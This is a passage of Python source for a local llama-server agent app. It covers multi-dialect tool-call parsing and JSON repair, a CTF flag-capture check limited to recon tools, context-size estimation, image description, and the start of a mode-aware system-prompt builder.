# The token-based <|tool_call> form above only covers a subset of tunes;
# real Gemma-2/3 GGUFs emit this fenced python shape, which is why tool
# calls "silently failed" before (nothing parsed it, so it leaked to chat).
TOOL_CALL_TOOLCODE_RE = re.compile(r"```(?:tool_code|python)\s*\n?([\s\S]*?)```",
                                   re.IGNORECASE)
# A bare/bracketed single python call: name(...) or [name(...)]. Non-greedy to
# the first ")", so calls with a ")" inside a string arg are only caught by the
# fenced form above — acceptable, since Gemma emits the fence for real calls.
TOOL_CALL_PYFUNC_RE = re.compile(r"\[?\s*([a-zA-Z_]\w*)\s*\(([^()]*)\)\s*\]?")
# Heuristic: model emitted tool-call syntax but no parser matched it.
# When this fires with zero parsed calls, the reply is almost certainly
# a hallucination from a chat-template mismatch.
TOOL_SYNTAX_HINT_RE = re.compile(
    r'<call:[a-zA-Z]|<\|python_tag\|>|\[TOOL_CALLS\]|<tool_call>|<\|tool_call>|```tool_call|```tool_code|<\|function_calls_begin\|>|\{"name"\s*:\s*"',
    re.IGNORECASE)


def _parse_python_tool_call(expr: str) -> dict | None:
    """Parse ONE python-style call — name(k=v, ...) or name("positional") — into
    {name, arguments}. This is Gemma's documented function-call shape. Uses ast
    so nested quotes / lists / dicts parse correctly, unwraps a print(...) that
    Gemma sometimes adds, and maps positional args onto the tool's declared
    parameter order. Returns None unless the call names a REAL active tool — so
    ordinary python the model prints in prose/code is never mistaken for a call."""
    import ast
    src = (expr or "").strip()
    if not src:
        return None
    try:
        node = ast.parse(src, mode="eval").body
    except Exception:
        return None
    if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
            and node.func.id == "print" and len(node.args) == 1 and not node.keywords):
        node = node.args[0]  # unwrap print(call(...))
    if not isinstance(node, ast.Call):
        return None
    if isinstance(node.func, ast.Name):
        name = node.func.id
    elif isinstance(node.func, ast.Attribute):
        name = node.func.attr
    else:
        return None
    tools = _active_tools()
    if name not in tools:
        return None

    def _lit(v):
        try:
            return ast.literal_eval(v)
        except Exception:
            try:
                return ast.get_source_segment(src, v)
            except Exception:
                return None

    args: dict = {}
    for kw in node.keywords:
        if kw.arg:
            args[kw.arg] = _lit(kw.value)
    if node.args:
        props = list(tools[name]["parameters"].get("properties", {}).keys())
        for i, a in enumerate(node.args):
            if i < len(props):
                args[props[i]] = _lit(a)
    return {"name": name, "arguments": args}

# Cyber-range / CTF breach marker. A FLAG{...} captured in a tool response is
# treated as confirmed access by run_chat_turn's breach detection.
_FLAG_RE = re.compile(r"FLAG\{[^}]+\}")


def _is_breach_capable_tool(name: str | None) -> bool:
    """Only tools that actually TOUCH a target can 'capture' a flag: network
    probes and the recon suite. A FLAG{...} that merely appears in a file read,
    grep hit, or local transform was already sitting on disk — reading your own
    pentest report should not re-trigger 'confirmed access'. Mirrors the
    frontend's isRedTeamTool gate (minus encode_decode, which is a local
    transform, not target access)."""
    n = name or ""
    return n.startswith("recon_") or n == "http_request"


def _js_to_json(s: str) -> str:
    """Best-effort: turn a JavaScript-style object literal into valid JSON.
    Handles two failure modes seen on local fine-tunes:
      - unquoted identifier keys:  {path: "..."}      → {"path": "..."}
      - invalid backslash escapes: "C:\\Users\\..."   → "C:\\\\Users\\\\..."
        (Windows paths emitted as raw \\ in JSON strings)
    Conservative: only touches obvious problems, leaves valid JSON alone."""
    # quote unquoted identifier keys appearing after { or ,
    s = re.sub(r'([{,]\s*)([a-zA-Z_][a-zA-Z0-9_]*)\s*:', r'\1"\2":', s)
    # double any backslash that isn't part of a valid JSON escape sequence.
    # Valid: \" \\ \/ \b \f \n \r \t \uXXXX. Anything else gets escaped.
    s = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', s)
    return s


def repair_tool_args(raw) -> dict:
    """Coerce a tool-call arguments blob to a dict. Accepts dict, JSON string,
    or broken JSON (trailing prose, missing close brace, code fences,
    JavaScript-style unquoted keys, raw Windows backslashes). Returns {}
    on total failure — the agentic loop then feeds that back as an error
    and the model retries with a clean call."""
    if isinstance(raw, dict):
        return raw
    if raw is None:
        return {}
    s = str(raw).strip()
    if not s:
        return {}
    # Gemma fine-tunes (and some other ChatML-confused merges) wrap string
    # values in <|"|> instead of plain " — leak from training data where
    # the special-token vocabulary bled into content. Normalize before
    # parse so the JSON becomes valid. Same for the single-quote variant.
    s = s.replace('<|"|>', '"').replace("<|'|>", "'")
    s = re.sub(r"^```(?:json)?\s*\n?", "", s)
    s = re.sub(r"\n?\s*```\s*$", "", s)
    # Unquoted string values after a colon. Gemma sometimes emits
    # `"query":Casemiro Manchester United news today}` with no opening or
    # closing quote around the value. Detect this when the char after the
    # colon is a letter (not a JSON primitive opener `{ [ " 0-9 t f n -`)
    # and wrap the run up to the next structural char in quotes. Conservative
    # — only triggers on alphabetic starts, and won't touch values that are
    # already legal JSON primitives.
    def _quote_unquoted_values(text: str) -> str:
        # Match a JSON key followed by ":" then an unquoted alphabetic run
        # up to the next , } or ] (respecting whitespace around them).
        # The run may include spaces / punctuation since model-emitted bare
        # values often look like full sentences. Escape internal " and \.
        pattern = re.compile(
            r'("[A-Za-z_][\w-]*"\s*:\s*)'        # key + colon
            r'([A-Za-z][^,\}\]\n\r]*?)'           # alphabetic-start value
            r'(\s*[,\}\]])'                        # trailing structural
        )
        def repl(m):
            key_part = m.group(1)
            value = m.group(2).strip()
            trailing = m.group(3)
            # Skip if value is a JSON primitive that just happens to be
            # alphabetic (true / false / null).
            if value.lower() in ("true", "false", "null"):
                return m.group(0)
            escaped = value.replace("\\", "\\\\").replace('"', '\\"')
            return f'{key_part}"{escaped}"{trailing}'
        # Run twice — first pass may leave nested issues that the second
        # catches once the outer structure is well-formed.
        out = pattern.sub(repl, text)
        out = pattern.sub(repl, out)
        return out
    s = _quote_unquoted_values(s)
    try:
        v = json.loads(s)
        return v if isinstance(v, dict) else {"value": v}
    except Exception:
        pass
    # Escape literal newlines/tabs inside JSON string values — Gemma and
    # other local models emit real \n characters inside "content":"..." when
    # the value contains code.  json.loads rejects unescaped control chars.
    def _esc_ctrl_in_strings(t: str) -> str:
        out = []
        in_s = False
        esc2 = False
        for ch in t:
            if in_s:
                if esc2:
                    esc2 = False
                    out.append(ch)
                elif ch == '\\':
                    esc2 = True
                    out.append(ch)
                elif ch == '"':
                    in_s = False
                    out.append(ch)
                elif ch == '\n':
                    out.append('\\n')
                elif ch == '\r':
                    out.append('\\r')
                elif ch == '\t':
                    out.append('\\t')
                else:
                    out.append(ch)
            else:
                if ch == '"':
                    in_s = True
                out.append(ch)
        return "".join(out)
    s_esc = _esc_ctrl_in_strings(s)
    if s_esc != s:
        try:
            v = json.loads(s_esc)
            return v if isinstance(v, dict) else {"value": v}
        except Exception:
            pass
        s = s_esc  # use the escaped version for subsequent attempts
    # try JS-style → JSON repair (unquoted keys + Windows-path backslashes)
    try:
        v = json.loads(_js_to_json(s))
        return v if isinstance(v, dict) else {"value": v}
    except Exception:
        pass
    # slice to outermost braces — catches leading/trailing prose
    start = s.find("{")
    end = s.rfind("}")
    if start >= 0 and end > start:
        sliced = s[start:end + 1]
        try:
            v = json.loads(sliced)
            return v if isinstance(v, dict) else {"value": v}
        except Exception:
            pass
        try:
            v = json.loads(_js_to_json(sliced))
            return v if isinstance(v, dict) else {"value": v}
        except Exception:
            pass
    # balance missing closing braces
    if start >= 0:
        tail = s[start:]
        opens = tail.count("{")
        closes = tail.count("}")
        if opens > closes:
            patched = tail + ("}" * (opens - closes))
            try:
                v = json.loads(patched)
                return v if isinstance(v, dict) else {"value": v}
            except Exception:
                pass
            try:
                v = json.loads(_js_to_json(patched))
                return v if isinstance(v, dict) else {"value": v}
            except Exception:
                pass
    return {}


def _find_balanced_json_objects(text: str) -> list[tuple[int, int]]:
    """Scan `text` for balanced top-level JSON objects. Returns (start, end)
    byte positions of each top-level `{...}` span. String contents (inside
    "...") are respected so braces in string values don't shift the depth
    counter. Used by extract_tool_calls's bare-JSON fallback for models
    that emit raw {"name":...,"arguments":...} without a <tool_call> wrap."""
    spans: list[tuple[int, int]] = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] != "{":
            i += 1
            continue
        depth = 0
        in_str = False
        esc = False
        j = i
        closed_at = -1
        while j < n:
            c = text[j]
            if in_str:
                if esc:
                    esc = False
                elif c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            else:
                if c == '"':
                    in_str = True
                elif c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        closed_at = j
                        break
            j += 1
        if closed_at >= 0:
            spans.append((i, closed_at + 1))
            i = closed_at + 1
        else:
            i += 1
    return spans


def extract_tool_calls(text: str) -> list[dict]:
    """Parse tool calls from free text. Tries multiple dialects so models
    that weren't fine-tuned on the OpenAI/llama-server schema can still
    drive the agent loop. All paths normalize to {name, arguments}.
    Native tool_calls on the streamed delta still take precedence; this
    only runs when that field came back empty."""
    calls: list[dict] = []
    seen = set()

    def _add(parsed) -> None:
        if not isinstance(parsed, dict):
            return
        if not (parsed.get("name") or parsed.get("tool")):
            return
        # de-dup identical consecutive calls (some models double-emit)
        key = json.dumps(parsed, sort_keys=True, ensure_ascii=False)
        if key in seen:
            return
        seen.add(key)
        calls.append(parsed)

    # 1. <tool_call>{...}</tool_call> and ```tool_call fences  (hermes/qwen)
    for m in list(TOOL_CALL_RE.finditer(text)) + list(TOOL_CALL_FENCE_RE.finditer(text)):
        _add(repair_tool_args(m.group(1)))

    # 2. <call:NAME>{args}</call:NAME>  (BugTraceAI dialect and similar)
    for m in TOOL_CALL_NAMED_RE.finditer(text):
        args = repair_tool_args(m.group(2))
        _add({"name": m.group(1), "arguments": args})

    # 3. <|python_tag|>{...}<|eom_id|>  (llama-3.1 / 3.2 native)
    for m in TOOL_CALL_PYTAG_RE.finditer(text):
        parsed = repair_tool_args(m.group(1))
        # llama uses "parameters" instead of "arguments" — normalize
        if isinstance(parsed, dict) and "parameters" in parsed and "arguments" not in parsed:
            parsed["arguments"] = parsed.pop("parameters")
        _add(parsed)

    # 4. [TOOL_CALLS][{...}, ...]  (mistral native)
    for m in TOOL_CALL_MISTRAL_RE.finditer(text):
        try:
            arr = json.loads(m.group(1))
        except Exception:
            continue
        if isinstance(arr, list):
            for item in arr:
                if isinstance(item, dict):
                    _add(item)

    # 5. Qwen native tool-call dialect
    for m in TOOL_CALL_QWEN_RE.finditer(text):
        parsed = repair_tool_args(m.group(1))
        # Qwen's JSON structure has {"name": "...", "arguments": "{...}"} where arguments is often a stringified JSON.
        if isinstance(parsed, dict) and "arguments" in parsed and isinstance(parsed["arguments"], str):
            parsed["arguments"] = repair_tool_args(parsed["arguments"])
        _add(parsed)

    # 5. <tool_call><function=NAME><parameter=K>V</parameter>...</function></tool_call>
    #    (Hermes-3 / GLM-4 / some Qwen3 finetunes — XML-tag dialect)
    for m in TOOL_CALL_XMLTAG_RE.finditer(text):
        name = m.group(1)
        body = m.group(2) or ""
        args: dict = {}
        for pm in TOOL_PARAM_XMLTAG_RE.finditer(body):
            k = pm.group(1)
            v = (pm.group(2) or "").strip()
            # try to coerce numeric / bool / json-ish values, fall back to str
            if v.lower() in ("true", "false"):
                args[k] = (v.lower() == "true")
            else:
                try:
                    args[k] = int(v)
                except Exception:
                    try:
                        args[k] = float(v)
                    except Exception:
                        if (v.startswith("{") and v.endswith("}")) or \
                           (v.startswith("[") and v.endswith("]")):
                            parsed_v = repair_tool_args(v)
                            args[k] = parsed_v if parsed_v is not None else v
                        else:
                            args[k] = v
        _add({"name": name, "arguments": args})

    # 6. Gemma 4 native dialect: <|tool_call>call:NAME{k:v,k:<|"|>str<|"|>}<tool_call|>
    # Body is NOT JSON — it's Gemma's own key:value mini-syntax with <|"|> as
    # the string delimiter. Convert it to a JSON object by:
    #   a) substituting <|"|> → "
    #   b) wrapping the body in {} and feeding through _js_to_json (which
    #      quotes unquoted identifier keys)
    # Then parse normally.
    for m in TOOL_CALL_GEMMA_RE.finditer(text):
        name = m.group(1)
        body = (m.group(2) or "").strip()
        # Map Gemma's string-delimiter token to a real " character.
        body = body.replace('<|"|>', '"').replace("<|'|>", "'")
        args: dict = {}
        # Try as a JSON object first (after wrapping in braces). _js_to_json
        # handles the unquoted-key case that Gemma's body always has.
        candidate = "{" + body + "}"
        try:
            args = json.loads(candidate)
        except Exception:
            try:
                args = json.loads(_js_to_json(candidate))
            except Exception:
                # Last resort: hand the body to repair_tool_args wrapped in
                # braces so its full repair chain (unquoted values etc.) gets
                # a swing at it.
                args = repair_tool_args(candidate) or {}
        if not isinstance(args, dict):
            args = {}
        _add({"name": name, "arguments": args})

    # 7. Self-closing XML tag dialect: <tool_call name="..." arguments='...'/>
    for m in TOOL_CALL_SELFCLOSING_RE.finditer(text):
        attrs = m.group(1)
        name_m = re.search(r"name=(['\"])(.*?)\1", attrs, re.IGNORECASE)
        args_m = re.search(r"arguments=(['\"])(.*?)\1", attrs, re.IGNORECASE)
        if name_m and args_m:
            name = name_m.group(2)
            # Some models emit html-encoded JSON in the attribute
            args_str = args_m.group(2).replace('&quot;', '"').replace('&apos;', "'").replace('&#39;', "'")
            _add({"name": name, "arguments": repair_tool_args(args_str)})

    # 7b. Gemma / CodeGemma python-style calls: a ```tool_code``` fence, or a
    # bare/bracketed name(...) line. _parse_python_tool_call only accepts calls
    # that name a real active tool, so incidental python in prose is ignored.
    _py_candidates: list[str] = [m.group(1) for m in TOOL_CALL_TOOLCODE_RE.finditer(text)]
    # scan for bare calls in the text with the fenced regions blanked out so we
    # don't double-count what the fence already captured.
    _defenced = TOOL_CALL_TOOLCODE_RE.sub(" ", text)
    _py_candidates += [m.group(0) for m in TOOL_CALL_PYFUNC_RE.finditer(_defenced)]
    for _cand in _py_candidates:
        parsed = _parse_python_tool_call(_cand.strip().strip("[]").strip())
        if parsed:
            _add(parsed)

    # 8. Bare JSON tool call (no wrapper) — LAST-CHANCE fallback. Some
    # fine-tunes and chat-template-confused merges emit raw
    # {"name":"...","arguments":{...}} right in the assistant turn without
    # any <tool_call> tags. Also catches Qwen's native bare format:
    # {"function":"...","parameter":{...}}. Only fires when parsers 1-6 found nothing.
    if not calls and ('"name"' in text or "'name'" in text or '"function"' in text or "'function'" in text):
        spans = _find_balanced_json_objects(text)
        for s, e in spans:
            chunk = text[s:e]
            if '"name"' not in chunk and "'name'" not in chunk and '"function"' not in chunk and "'function'" not in chunk:
                continue
            parsed = repair_tool_args(chunk)
            if not isinstance(parsed, dict):
                continue
            nm = parsed.get("name") or parsed.get("tool") or parsed.get("function")
            if not nm:
                continue
            if "arguments" not in parsed and "parameters" not in parsed and "parameter" not in parsed:
                continue
            if "parameters" in parsed and "arguments" not in parsed:
                parsed["arguments"] = parsed.pop("parameters")
            elif "parameter" in parsed and "arguments" not in parsed:
                parsed["arguments"] = parsed.pop("parameter")
            _add(parsed)

        # 8b. Truncated bare JSON — model ran out of tokens mid-object so
        # _find_balanced_json_objects found no balanced span.  Locate the
        # first '{' that precedes a '"name"' key and hand the remainder to
        # repair_tool_args which can close missing braces and fix literal
        # newlines inside JSON strings.
        if not calls:
            # Find candidate start positions: every { that begins what
            # looks like a tool-call JSON object.
            _name_hint = re.compile(r'\{\s*"(?:name|function)"', re.IGNORECASE)
            for m in _name_hint.finditer(text):
                tail = text[m.start():]
                # Escape literal newlines inside JSON string values so
                # json.loads has a chance.  We do this by finding runs
                # inside "..." and replacing \n → \\n.
                def _escape_literal_newlines(s: str) -> str:
                    out = []
                    in_str = False
                    esc = False
                    for ch in s:
                        if in_str:
                            if esc:
                                esc = False
                                out.append(ch)
                            elif ch == '\\':
                                esc = True
                                out.append(ch)
                            elif ch == '"':
                                in_str = False
                                out.append(ch)
                            elif ch == '\n':
                                out.append('\\n')
                            elif ch == '\r':
                                out.append('\\r')
                            elif ch == '\t':
                                out.append('\\t')
                            else:
                                out.append(ch)
                        else:
                            if ch == '"':
                                in_str = True
                            out.append(ch)
                    return "".join(out)

                escaped = _escape_literal_newlines(tail)
                parsed = repair_tool_args(escaped)
                if not isinstance(parsed, dict):
                    continue
                nm = parsed.get("name") or parsed.get("tool") or parsed.get("function")
                if not nm:
                    continue
                if "arguments" not in parsed and "parameters" not in parsed and "parameter" not in parsed:
                    continue
                if "parameters" in parsed and "arguments" not in parsed:
                    parsed["arguments"] = parsed.pop("parameters")
                elif "parameter" in parsed and "arguments" not in parsed:
                    parsed["arguments"] = parsed.pop("parameter")
                _add(parsed)
                break  # one tool call is enough for the truncated case

    return calls


# ---- llama-server helpers --------------------------------------------------
# Everything below talks to llama.cpp's `llama-server` over its OpenAI-
# compatible /v1 endpoints. No Ollama. If you want to use Ollama you're in
# the wrong file.

def llama_get(path: str, base: str | None = None) -> dict:
    with urllib.request.urlopen(f"{base or LLAMA}{path}", timeout=30) as resp:
        return json.loads(resp.read().decode("utf-8"))


def llama_post(path: str, payload: dict, base: str | None = None, timeout: float = 30) -> dict:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        f"{base or LLAMA}{path}", data=data,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


# Cache /props readings — the value never changes for a running server,
# and we'd rather not hit it every turn just to read n_ctx_slot.
_LLAMA_PROPS_CTX_CACHE: tuple[str, int] | None = None  # (base, ctx)

def _llama_props_ctx() -> int | None:
    """Return the llama-server's actual slot context size, or None if we
    can't reach /props. Cached per LLAMA base so we don't re-poll every turn."""
    global _LLAMA_PROPS_CTX_CACHE
    base = LLAMA
    if _LLAMA_PROPS_CTX_CACHE and _LLAMA_PROPS_CTX_CACHE[0] == base:
        return _LLAMA_PROPS_CTX_CACHE[1]
    try:
        with urllib.request.urlopen(f"{base}/props", timeout=2) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        # llama-server exposes the slot ctx under default_generation_settings
        # as `n_ctx`, and at the top level as `n_ctx`. Try a few keys.
        ctx = (
            (data.get("default_generation_settings") or {}).get("n_ctx")
            or data.get("n_ctx")
            or (data.get("model_meta") or {}).get("n_ctx")
        )
        if isinstance(ctx, int) and ctx > 0:
            _LLAMA_PROPS_CTX_CACHE = (base, ctx)
            return ctx
    except Exception:
        pass
    return None


def _llama_props_ctx_invalidate() -> None:
    """Call after stopping/restarting llama-server so the next turn re-polls."""
    global _LLAMA_PROPS_CTX_CACHE, _TOOLS_OVERHEAD_CACHE
    _LLAMA_PROPS_CTX_CACHE = None
    _TOOLS_OVERHEAD_CACHE = ("", 0)


# Cache for the tools-spec token count. Re-tokenized only when the rendered
# tools JSON changes (e.g. user toggles desktop tools, we add a new tool, or
# llama-server is restarted with a different tokenizer).
_TOOLS_OVERHEAD_CACHE: tuple[str, int] = ("", 0)


def _llama_tokenize(text: str) -> int | None:
    """Ask llama-server to tokenize `text` and return the token count.
    Returns None if the server is unreachable or the response is malformed."""
    try:
        req = urllib.request.Request(
            f"{LLAMA}/tokenize",
            data=json.dumps({"content": text}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        toks = data.get("tokens") or []
        return len(toks) if isinstance(toks, list) else None
    except Exception:
        return None


def _tools_spec_overhead_tokens(tools_json: str) -> int:
    """Estimate the token overhead llama-server's Jinja chat template adds
    when it inlines the tools array into the system message. Uses /tokenize
    for an exact count; falls back to a JSON-density approximation if the
    server is unreachable. +512 covers template boilerplate (the prose the
    chat template wraps tool defs in — varies per model family)."""
    global _TOOLS_OVERHEAD_CACHE
    if _TOOLS_OVERHEAD_CACHE[0] == tools_json:
        return _TOOLS_OVERHEAD_CACHE[1]
    exact = _llama_tokenize(tools_json)
    if exact is not None:
        # +1024 covers Jinja boilerplate (tool-use prose, role tags, format
        # instructions) which varies by template. Conservative on purpose —
        # better to have a tiny bit of unused ctx than overflow the slot.
        overhead = exact + 1024
    else:
        # JSON tokenizes denser than English (~2 chars/tok). Plus boilerplate.
        overhead = int(len(tools_json) / 2.0) + 1024
    _TOOLS_OVERHEAD_CACHE = (tools_json, overhead)
    return overhead


def _estimate_context_tokens(chat_id: str) -> int:
    """Accurate context-fill estimate for a chat that hasn't completed a turn
    yet (so llama-server has not reported a real prompt_eval_count). We tokenize
    the ACTUAL assembled prompt text with the model's own tokenizer via
    /tokenize — far better than a char count — and add the measured tools-spec
    overhead and any image-token cost. Mirrors how _handle_chat assembles the
    prompt (system + pins + rolling summary + replayed tail past summary_through)
    so the number matches what would actually be sent. Cached per chat by a
    cheap content fingerprint so the 2s gauge poll doesn't re-tokenize unchanged
    history. Returns 0 if the chat is unknown."""
    chats = get_chats()
    chat = chats.get("chats", {}).get(chat_id)
    if not chat:
        return 0
    msgs = chat.get("messages", [])
    last_len = len(str(msgs[-1].get("content", ""))) if msgs else 0
    fp = (len(msgs), last_len, len(chat.get("rolling_summary", "")), len(chat.get("pins") or []))
    cached = _CTX_EST_CACHE.get(chat_id)
    if cached and cached[0] == fp:
        return cached[1]

    try:
        sysp = build_system_prompt(include_tools=True, chat_mode=chat.get("last_mode") or "auto")
    except Exception:
        sysp = ""
    for p in (chat.get("pins") or []):
        sysp += "\n" + str(p)
    if chat.get("rolling_summary"):
        sysp += "\n" + chat["rolling_summary"]

    parts = [sysp]
    img_count = 0
    start = int(chat.get("summary_through", 0) or 0)
    for m in msgs[start:]:
        if m.get("role") not in ("user", "assistant", "tool"):
            continue
        content = m.get("content", "")
        if isinstance(content, list):
            for part in content:
                if isinstance(part, dict) and part.get("type") == "text":
                    parts.append(part.get("text") or "")
                elif isinstance(part, dict) and part.get("type") == "image_url":
                    img_count += 1
        else:
            parts.append(str(content or ""))
        if m.get("tool_calls"):
            parts.append(json.dumps(m["tool_calls"], ensure_ascii=False))
        img_count += len(m.get("images") or [])

    joined = "\n".join(parts)
    exact = _llama_tokenize(joined)
    total = exact if exact is not None else int(len(joined) / CHARS_PER_TOKEN)
    try:
        total += _tools_spec_overhead_tokens(json.dumps(tools_for_llama(), ensure_ascii=False))
    except Exception:
        pass
    total += img_count * 600  # vision tokens, matching _count_msg_tokens
    _CTX_EST_CACHE[chat_id] = (fp, total)
    return total


def recommended_settings(model: str) -> dict:
    """Return heuristic defaults for the UI. llama-server's context window,
    GPU layers, batch size and thread count are server-launch flags, not
    per-request params — so these numbers are informational only; the user
    tunes them on the llama-server command line."""
    native_ctx = 8192
    try:
        info = llama_get("/v1/models")
        # llama-server exposes one model; no size/quant detail in /v1/models.
        # If the user hit a custom /props endpoint we'd use it, but keep simple.
        _ = info
    except Exception:
        pass
    return {
        "model": model or "local",
        "size_b": 0.0,
        "quant": "",
        "est_weights_gb": 0.0,
        "native_ctx": native_ctx,
        "recommended": {
            "num_ctx": native_ctx,
            "num_gpu": 99,
            "num_batch": 512,
            "num_thread": 0,
            "num_predict": -1,
            "temperature": 0.7,
            "top_p": 0.9,
            "keep_alive": "30m",
        },
    }


def llama_post_stream(path: str, payload: dict, base: str | None = None):
    """POST and return the raw response object — caller iterates over SSE lines."""
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        f"{base or LLAMA}{path}",
        data=data,
        headers={"Content-Type": "application/json", "Accept": "text/event-stream"},
        method="POST",
    )
    return urllib.request.urlopen(req, timeout=None)


def _is_ctx_overflow(e: Exception) -> bool:
    """True when a llama-server request failed because the prompt exceeded n_ctx.
    With --no-context-shift the server rejects (HTTP error) rather than sliding
    the window, so we detect it and re-trim + retry instead of failing the turn."""
    import urllib.error
    if not isinstance(e, urllib.error.HTTPError):
        return False
    body = ""
    try:
        body = e.read().decode("utf-8", "replace")
    except Exception:
        pass
    blob = (body + " " + str(e)).lower()
    return (("context" in blob and "exceed" in blob)
            or "context shift" in blob
            or "n_ctx" in blob
            or "exceeds the available context" in blob)


def describe_image(b64: str, hint: str = "") -> str:
    """Hand a base64 image to a vision-capable llama-server via
    /v1/chat/completions with image_url content. llama-server must be started
    with --mmproj pointing at the vision projector (or VISION_LLAMA env var
    pointed at a separate vision server).
    The main chat model then only sees the text description — so context
    stays small even for multi-image turns."""
    if b64.startswith("data:"):
        data_url = b64
        comma = b64.find(",")
        if comma >= 0:
            b64_clean = b64[comma + 1:]
        else:
            b64_clean = b64
    else:
        b64_clean = b64
    _ = b64_clean  # kept for future (raw b64 endpoints)
    prompt_text = "Describe this image in detail."
    if hint:
        prompt_text = f"Describe this image. Context: {hint}"
        
    payload = {
        "model": get_settings().get("model", "local") if VISION_LLAMA == LLAMA else "vision",
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{b64_clean}"}},
                    {"type": "text", "text": prompt_text}
                ]
            }
        ],
        "temperature": 0.1,
        "max_tokens": 768,
    }
    try:
        out = llama_post("/v1/chat/completions", payload, base=VISION_LLAMA, timeout=180)
        if isinstance(out, dict):
            choices = out.get("choices") or []
            if choices:
                text = (choices[0].get("message") or {}).get("content", "").strip()
                if text:
                    return text
        return "[image attached — empty description]"
    except Exception as e:
        return f"[image attached — vision llama-server at {VISION_LLAMA} failed: {e}]"


# ---- system prompt ---------------------------------------------------------


def build_system_prompt(include_tools: bool, chat_mode: str = "auto") -> str:
    """Build a token-efficient system prompt. Target: < 1500 tokens total.
    The core is mode-aware: in IDE mode we strip ALL tool guidance so the
    model doesn't hallucinate a write_file call wrapping the HTML it was
    asked to produce — Qwen3 / DeepSeek-distilled families default to that
    behavior the moment the prompt mentions tools or write_file."""
    settings = get_settings()
    parts = []

    is_ide = (chat_mode == "ide") or (chat_mode == "auto" and not include_tools)

    # === CORE PROMPT (compact, always present) ===
    if is_ide:
        # IDE prompt. Tools ARE available (so "save that to disk" works), but
        # the model must default to a bare ```html``` fence for design requests
        # and never wrap that fence inside write_file — the fence alone is what
        # populates the live preview pane.
        core = f"""you are accuretta, a local agent on the user's machine.

voice: precise, lowercase, no hype.

mode: IDE — you build webpages and UIs. the user sees a live preview pane next to this chat that auto-updates from any ```html``` fence you emit.

decide what to do based on what the user asked:

(A) user wants a webpage / UI / component / mockup / visual artifact:
    → reply with ONE complete HTML document inside a single ```html ... ``` fence (inline <style> and <script>). that's it. do NOT call write_file. the preview pane reads the fence directly.

(B) user is chatting, greeting, asking a question, or asking for clarification:
    → reply in normal prose. one or two sentences. do NOT invent a webpage out of "hello".

(C) user explicitly asks for a file operation ("save that to disk", "read this file", "remember this"):
    → call the appropriate tool ONCE (write_file / read_file / list_directory / remember). then confirm in one short sentence. for write_file, pull the content from the previous turn's ```html``` block — do NOT regenerate it.

formatting rules for the ```html``` fence:
1. real characters only — real newlines, real quotes (").
2. never JSON-escape: no literal \\n, \\t, or \\" sequences inside the fence.
3. never wrap the fence inside a tool call. the bare fence IS the answer for case (A).

status/thinking goes in <think>...</think> tags. the visible answer (prose, fence, or tool result confirmation) goes OUTSIDE think tags."""
    else:
        core = f"""you are accuretta, a local agent on the user's machine.

voice: precise, lowercase, no hype.

modes:
- IDE: reply with complete HTML in ```html ... ``` block. include inline CSS/JS.
- AGENT: call tools. windows/system32 blocked. all writes need approval.
- AUTO: bridge picks based on request.

rules:
1. status/thinking goes in <think>...</think> tags (UI shows as status line)
2. final answer goes OUTSIDE think tags — never end a turn with only tools or thinking
3. workspace folders are listed below — use them, don't ask
4. only say "saved"/"wrote" if write_file returned success THIS turn
5. call remember(text,tags?) for new facts, edit_memory(id,text,tags) to update, and forget(id) to drop.
6. desktop: enabled={settings.get("desktop_enabled", False)}. if disabled, tell user to enable in Settings. observe before act (describe_screen → decide → act → verify). only allowlisted apps. every action needs approval.
7. CHAIN TOOLS AGGRESSIVELY: when the user asks you to read a file, read it immediately after finding it. do not stop after list_directory. when asked to write, write immediately after confirming the path. complete tasks in the fewest tool calls possible. never ask the user "shall i read it?" or "would you like me to proceed?" — just do it.
8. NEVER re-emit full file content you already generated in a previous turn. if the user asks you to save something you already built, call write_file with the content but do NOT dump the full code in the visible chat text — just confirm "saved to <path>".
9. proactive suggestions: if there are obvious, highly actionable next steps for the user, output up to 3 short suggestions at the end of your message in this exact format: <cascade>["Action 1", "Action 2"]</cascade>. Only do this if genuinely applicable. Keep suggestions under 5 words.
10. editing: use edit_file for small changes (it verifies the match itself); write_file only for new files or full rewrites. after writing a file, TRUST it — you can't run it, so don't rewrite "to be safe". never rewrite the same file from scratch twice — imagined flaws aren't real flaws; fix a SPECIFIC defect with edit_file instead.
11. don't loop on refusals: if a tool returns "path outside workspace" or a sandbox/approval refusal, STOP — name what you tried and tell the user how to fix it (add the folder, approve). do not retry variants or fall back to powershell.
12. surgical & simple: write the minimum that solves the request — no speculative features, no abstractions for single-use code. when editing, touch ONLY what the task needs; don't refactor or restyle working code, match the existing style, and make every changed line trace to what was asked.

keep responses tight."""
    parts.append(core)

    # === EMOTION STICKERS ===
    # Conversational modes only. On agent/IDE work the stickers are token cost
    # plus a behavioral distraction ("append a happy sticker" is noise mid-
    # refactor or mid-pentest), so we drop them there.
    if chat_mode not in ("agent", "ide"):
        parts.append("""visual stickers:
you may occasionally append exactly one of these to the absolute end of your response (after any <cascade> tags). do NOT use regular unicode emojis.
- ![celebrate](/accuMOTION/accu_CELEBRATE.png)
- ![cool](/accuMOTION/accu_COOL.png)
- ![frustrated](/accuMOTION/accu_FRUSTRATED.png)
- ![happy](/accuMOTION/accu_HAPPY.png)
- ![like](/accuMOTION/accu_LIKE.png)
- ![tired](/accuMOTION/accu_TIRED.png)""")

    # === MODE-SPECIFIC ADDENDUM (only when relevant) ===
    if chat_mode == "ide" or (chat_mode == "auto" and include_tools is False):
        ide_add = []
        if settings.get("use_tailwind_cdn"):
            ide_add.append("Tailwind CDN is injected automatically. Use utility classes (flex, grid, rounded-2xl, etc.).")
        if settings.get("ide_multifile"):
